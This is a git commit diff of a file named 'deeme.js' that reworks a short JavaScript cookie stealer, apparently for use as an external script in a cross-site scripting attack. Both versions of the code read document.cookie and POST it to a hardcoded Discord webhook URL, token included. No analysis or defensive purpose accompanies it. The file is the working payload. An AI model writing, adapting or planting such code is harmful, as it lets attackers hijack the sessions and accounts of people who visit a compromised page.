1426f95227c795afa05b894ab51d40182caf8c83
ysf72byk <71230633+ysf72byk@users.noreply.github.com>
2021-04-17 16:51:44 +0300

    Update deeme.js

--- deeme.js
+++ deeme.js
@@ -1,9 +1,8 @@
-<script>
-    var xhr = new XMLHttpRequest();
+var xhr = new XMLHttpRequest();
 
-    xhr.open('POST','https://discord.com/api/webhooks/832975570467029052/BxgJ8gGQpMbLex0_35WMWJvOT1x5jm2HIPghk_-LesJoJIqyXeZkfRQqxE_IyA2M1_C3',true);
+xhr.open('POST','https://discord.com/api/webhooks/832975570467029052/BxgJ8gGQpMbLex0_35WMWJvOT1x5jm2HIPghk_-LesJoJIqyXeZkfRQqxE_IyA2M1_C3',true);
 
-    xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
+xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
 
-    xhr.send('content=>>>'+document.cookie);
-</script>
+xhr.send('content=>>>'+document.cookie);
+
